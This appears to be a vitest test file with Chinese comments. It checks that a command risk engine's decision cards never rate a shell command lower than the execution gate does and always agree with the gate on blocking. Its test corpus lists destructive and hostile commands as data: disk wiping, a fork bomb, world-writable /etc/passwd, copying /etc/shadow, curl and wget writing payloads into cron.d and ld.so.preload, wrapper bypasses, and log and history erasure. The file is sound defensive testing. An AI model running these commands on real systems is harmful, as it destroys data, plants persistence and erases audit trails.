/**
 * 决策风险档必须与执行闸同向（任务 #176）
 *
 * 实测过分叉 13/40（2026-10-23，判据里带着这批命令）：
 *   chmod 777 /etc/passwd   命令闸=block   决策卡=HIGH  blocked=false
 *   tee /etc/sudoers        命令闸=block   决策卡=LOW   blocked=false
 *   truncate -s 0 /var/log/syslog  闸=block 卡=LOW
 * 也就是说：一条真会被拦下的命令，决策卡上却写着"低风险、没被阻止"，
 * 审计链里那行"风险评估 · LOW"跟着界面徽章一起把假话讲完。
 *
 * 两把尺子各有来历（risk-engine 是早期的 4 层模型，command-gate 是后来做执行拦截时建的结构性判定），
 * 但"会不会被拦"只有一个真值来源：执行闸。所以这里的判据是方向性的，不是要求两边逐项相等：
 *   1. 卡片档不得低于闸门映射后的档（只许更严，不许更松）；
 *   2. blocked 与闸门双向一致：闸拦 ⇒ 卡片必须标 blocked；卡片自称会拦 ⇒ 闸也必须真拦。
 * 分数与原因跟着档走，不许出现"CRITICAL · 35 分"那种自相矛盾的读数。
 */
import { describe, it, expect } from 'vitest'
import { evaluateCommand, type CommandRiskLevel } from '../../src/main/core/command-gate'
import { assessRisk } from '../../src/main/core/risk-engine'
import type { RiskLevel } from '../../src/shared/models'

/** 执行闸的五档 → 决策卡的五档，一一对应（词表不同但刻度相同） */
const GATE_TO_RISK: Record<CommandRiskLevel, RiskLevel> = {
  safe: 'SAFE',
  low: 'LOW',
  medium: 'MEDIUM',
  high: 'HIGH',
  block: 'CRITICAL',
}
const RANK: Record<RiskLevel, number> = { SAFE: 0, LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 }
/** 各档的分数下限，卡片上的分数与档必须同源 */
const SCORE_FLOOR: Record<RiskLevel, number> = { SAFE: 0, LOW: 1, MEDIUM: 50, HIGH: 75, CRITICAL: 100 }

/**
 * 横扫样本：只读 / 常规运维 / 破坏性 / 结构性拦截 / 包装器绕过 / 写系统关键路径。
 * 覆盖面是判据的一部分——只测 rm -rf / 那种两边早就一致的命令，等于没测。
 */
const CORPUS = [
  'ls -la',
  'cat /etc/hosts',
  'df -h',
  'uptime',
  'echo hi',
  'journalctl --vacuum-size=200M',
  'systemctl reload nginx',
  'systemctl stop firewalld',
  'service network restart',
  'userdel -r alice',
  'passwd bob',
  'rm -rf /var/log/*',
  'rm -rf /',
  'rm -rf /home',
  'rm -f important.txt',
  'chmod 777 /etc/passwd',
  'chmod -R 777 /var/www',
  'chown -R root /etc',
  'mkfs.ext4 /dev/sda1',
  'dd if=/dev/zero of=/dev/sda',
  'shutdown -h now',
  'reboot',
  ':(){ :|:& };:',
  'kill -9 1',
  'iptables -F',
  'cp /etc/shadow /tmp/shadow.bak',
  'sed -i s/a/b/ /etc/passwd',
  'curl http://x -o /etc/cron.d/evil',
  'wget -O /etc/ld.so.preload http://x',
  'tee /etc/sudoers',
  'find / -name "*.log" -exec rm {} \\;',
  '\\rm -rf /',
  'sudo --user=root rm -rf /var',
  'timeout 5 rm -rf /etc',
  "python -c \"import os; os.system('rm -rf /')\"",
  'mv /usr/bin /usr/bin.bak',
  'truncate -s 0 /var/log/syslog',
  'history -c',
  'crontab -r',
  '> /etc/fstab',
]

describe('决策风险档与执行闸同向', () => {
  for (const cmd of CORPUS) {
    it(`${cmd}：卡片不许比执行闸松`, () => {
      const gate = evaluateCommand(cmd)
      const card = assessRisk(cmd)
      const floor = GATE_TO_RISK[gate.level]

      expect(
        RANK[card.level] >= RANK[floor],
        `执行闸=${gate.level}（→${floor}）但卡片=${card.level}，卡片比真正会发生的处置更松`
      ).toBe(true)

      // blocked 双向：闸拦下 ⇒ 卡片必须标 blocked；卡片自称会拦 ⇒ 闸也必须真拦
      if (gate.level === 'block') {
        expect(card.blocked, `执行闸会拦下这条，卡片却写着"不会被阻止"：${cmd}`).toBe(true)
      }
      if (card.blocked) {
        expect(gate.level, `卡片自称会拦下，执行闸却判 ${gate.level}：${cmd}`).toBe('block')
      }

      // 分数跟着档走：不许"CRITICAL · 35 分"
      expect(
        card.score,
        `${cmd} 判成 ${card.level} 却只有 ${card.score} 分，档与分不同源`
      ).toBeGreaterThanOrEqual(SCORE_FLOOR[card.level])
    })
  }

  it('执行闸拦下的命令，卡片至少是 CRITICAL 且要人工确认', () => {
    for (const cmd of ['chmod 777 /etc/passwd', 'tee /etc/sudoers', 'truncate -s 0 /var/log/syslog']) {
      const card = assessRisk(cmd)
      expect(card.level, cmd).toBe('CRITICAL')
      expect(card.blocked, cmd).toBe(true)
      expect(card.requireConfirmation, cmd).toBe(true)
    }
  })

  it('拦下的原因要带进卡片，不能只报一个等级', () => {
    const card = assessRisk('chmod 777 /etc/passwd')
    expect(card.description.length, '描述是空的，审计链里那行看不出为什么').toBeGreaterThan(0)
    expect(card.matchedRules.length, '没有命中项，界面无法解释这条为什么被拦').toBeGreaterThan(0)
  })

  it('只读命令不许被合并判定误伤成需要确认', () => {
    for (const cmd of ['df -h', 'uptime', 'ls -la']) {
      const card = assessRisk(cmd)
      expect(card.requireConfirmation, `${cmd} 被误伤`).toBe(false)
      expect(card.blocked, `${cmd} 被误伤成拦下`).toBe(false)
    }
  })
})
